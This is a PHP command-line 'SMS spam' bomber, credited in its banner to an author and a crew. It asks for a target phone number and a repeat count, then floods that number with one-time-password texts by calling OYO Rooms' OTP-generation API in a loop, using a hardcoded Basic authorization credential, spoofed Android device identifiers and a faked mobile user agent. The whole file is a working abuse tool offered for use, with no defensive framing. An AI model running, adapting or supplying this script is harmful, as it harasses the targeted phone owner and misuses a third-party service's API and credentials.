<?php
function spam($no, $jum) {
	for ($i=1; $i <= $jum; $i++) {
	$header = array("access_token: QmpDZlRxZWo2UkZ5M3pSeHZ5NW46bi13NHN0ZTV5V1I1aGpCUVVHOUM=", "Content-Type: application/json", "OYO_AB_CONFIG: 1543775334527|dea:1|mwhp:1|t3c:1|epba:0|rst2:1|phbb:0|wcta:1|wtea:1|cdr2:0|popl:0|bann:1|sbma:1|rae:1|gmfh:1|prep:1|hbna:1|absb:0|sbmi:1|se5:10|se4:1|se6:15|cour:0|gsra:1|rtsi:1|cdr:1|rd:1|lzpi:1|uprc:1|rbl:1|rsa:0|dww2:1|deal:0|pnpd:1|rcua:1|rsi:0|gsti:1|dwep:2|otp4:1|urha:1|ppa:2|ona:0|svh:1|stc2:1|urhi:1|ppi:2|gsta:0|nlab:1|asa:1|cr:1|rts:1|nlp:1|onab:1|asi:0|wtei:1|asei:1|bsba:2|aca:1|bea:1|wtib:2|lyr:0|aci:0|scta:0|tspk:1|tspj:1|DWWS:1|a2hs:1|brch:4|test:1|raab:0|aswp:1|shli:0|hrt:1|riab:0|hbad:0|rcui:1|sbpa:0|stcl:0|sbpi:0|sinc:1|shla:0|brea:1|lpta:0|lpti:0|ffab:1|his2:0|hbci:1|pst:1|stfi:2|pce:1|stft:2|omue:0|brei:1|hsei:0|sold:1|hbca:1|home:1|scti:0|otab:1|gsa:1|dwhp:0|gsi:1|rasl:0|locr:0|obai:1|dbad:1|nrca:1|epa:2|nrci:1|epi:0|epn:2|fbb:0|trab:1|rmo2:1|niab:0|weng:0|sls:1|phli:0|gpwa:0|nsl:0|prpa:1|saet:1|gpwi:0|nrfa:0|prpi:1|hbi2:0|saea:1|mrc:1|blh:1|cpab:1|hpsa:0|octt:1|phb:1|hpsi:0|cadd:1|nsfa:1|oban:1|spc2:1|smla:0|auto:0|uiab:1|wtab:3|shel:1|hmpi:1|bdpi:1|pbra:1|sos:2|logn:1|rms:1|uaab:1|papg:1|bdpa:1|pbri:1|nob2:1|swar:1|aowt:1|spc:1|trCl:1|lbh:1|nrfi:0|lsc:1|pdhi:0|tsb:1|lsc2:0|diei:1|dmme:1|diea:1|dte:1|acsi:1|pdha:0|mwen:0|efa:1|hpwa:0|fbb2:0|sra:2|reca:1|paab:0|mwep:2|ngst:1|hpwi:1|reci:1|piab:1|aimg:1|ffib:1|mww2:1|ioab:1|hpfd:0|srz:0|socp:0|plwc:1", "Authorization: Basic QmpDZlRxZWo2UkZ5M3pSeHZ5NW46bi13NHN0ZTV5V1I1aGpCUVVHOUM=", "Content-Type: application/json");
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.oyorooms.com/v2/users/generate_otp?phone=$no&nod=4&intent=login&sms_auto_retrieval=true&country_code=%2B62&version=20176&partner_app_version=20176&android_id=6bb443543d62ab32&idfa=f4883355-288c-4528-b38f-d52ac56746f4&sid=154377531495");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
	$x = curl_exec($ch);
	curl_close($ch);
	$js = json_decode($x);
	if ($js->status == "correct") {
		echo $i. ".Terkirim Cuk :D\n";
	}else {
		echo $i. ".Gagal Dikirim\n";
		}
		}
	}
	$banner = "
=======================================
   ____                  ______  _______
  / __/__  ___ ___ _    / __/  |/  / __/
 _\ \/ _ \/ _ `/  ' \  _\ \/ /|_/ /\ \  
/___/ .__/\_,_/_/_/_/ /___/_/  /_/___/  
   /_/\n
Author : Aditia Alfiansyah\nTeam : TersakitiCrew
=======================================\n";
    sleep(2);
    echo $banner;
	echo "[+] masukan target : ";
	$no = trim(fgets(STDIN));
	sleep(1);
	echo "[+] masukan jumlah : ";
	$jum = trim(fgets(STDIN));
	sleep(1);
	echo "\n\nRESULT : \n";
	spam($no, $jum);
?>